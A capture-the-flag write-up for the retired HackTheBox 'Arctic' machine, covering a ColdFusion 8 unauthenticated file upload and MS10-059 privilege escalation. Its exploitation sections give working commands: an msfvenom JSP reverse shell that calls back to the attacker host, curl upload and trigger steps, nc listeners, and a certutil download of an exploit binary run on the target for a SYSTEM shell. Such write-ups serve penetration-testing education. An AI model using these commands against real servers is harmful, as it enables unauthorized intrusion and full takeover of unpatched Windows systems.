# HackTheBox — Arctic

**Platform:** HackTheBox  
**Difficulty:** Easy  
**OS:** Windows  
**Category:** Web Exploitation / Adobe ColdFusion / MS10-059  
**Status:** Retired  

---

## Summary

Arctic runs Adobe ColdFusion 8, which has an unauthenticated file upload vulnerability (CVE-2009-2265) allowing arbitrary JSP/CFML uploads. After gaining a shell as the service account, privilege escalation uses MS10-059 (Chimichurri), a local privilege escalation exploit for Windows Server 2008.

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -oA nmap/arctic 10.10.10.11
```

```
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmeremotecontrol?
49154/tcp open  msrpc   Microsoft Windows RPC
```

Port 8500 is unusual — visiting in browser reveals **Adobe ColdFusion 8** Administrator.

---

## Web Enumeration

### ColdFusion Admin Path

```
http://10.10.10.11:8500/CFIDE/administrator/
```

This is the ColdFusion admin login page. Version 8 is displayed.

---

## Exploitation

### CVE-2009-2265 — ColdFusion 8 Unauthenticated File Upload

ColdFusion 8 allows unauthenticated file uploads to the FCKeditor component.

**Upload endpoint:**

```
http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/
```

Create a JSP reverse shell:

```bash
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=10.10.14.X LPORT=4444 \
  -f raw -o shell.jsp
```

Upload via the exploit:

```bash
# Using the public PoC
python coldfusion_upload.py 10.10.10.11 8500 shell.jsp
```

Or with curl:

```bash
curl -F "newfile=@shell.jsp;type=application/x-java-archive" \
  "http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/"
```

Trigger the shell:

```bash
nc -lvnp 4444
curl http://10.10.10.11:8500/userfiles/file/shell.jsp
```

Shell as **tolis** (the ColdFusion service account).

---

## User Flag

```cmd
type C:\Users\tolis\Desktop\user.txt
```

---

## Privilege Escalation

### System Information

```cmd
systeminfo
```

```
OS Name: Microsoft Windows Server 2008 R2 Standard
OS Version: 6.1.7600 N/A Build 7600
```

No service pack — highly likely to be vulnerable to local privilege escalation exploits.

### Checking for Patches

```cmd
wmic qfe list
```

Very few patches applied — vulnerable to MS10-059.

### MS10-059 — Chimichurri (Task Scheduler LPE)

Download and upload the pre-compiled binary:

```bash
# On attacker
python3 -m http.server 8080
```

```cmd
# On target
certutil -urlcache -f http://10.10.14.X:8080/MS10-059.exe MS10-059.exe
MS10-059.exe 10.10.14.X 5555
```

Start a second listener:

```bash
nc -lvnp 5555
```

**SYSTEM shell obtained.**

---

## Root Flag

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

---

## Key Takeaways

- Port 8500 is commonly associated with ColdFusion — know your unusual ports
- ColdFusion's FCKeditor integration has well-documented unauthenticated upload vulnerabilities
- JSP shells work on ColdFusion servers (Java-based)
- `systeminfo` + `wmic qfe list` is your first step in Windows privilege escalation enumeration
- Unpatched Windows Server 2008 is vulnerable to several local privilege escalation exploits
- `certutil -urlcache -f` is a built-in Windows file transfer method

---

## CVE References

- **CVE-2009-2265** — Adobe ColdFusion 8 Unauthenticated File Upload
- **MS10-059 / CVE-2010-2554** — Windows Task Scheduler LPE (Chimichurri)

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| msfvenom | JSP shell generation |
| curl | File upload + trigger |
| netcat | Shell listener |
| certutil | Windows file transfer |
| MS10-059.exe | Local privilege escalation |
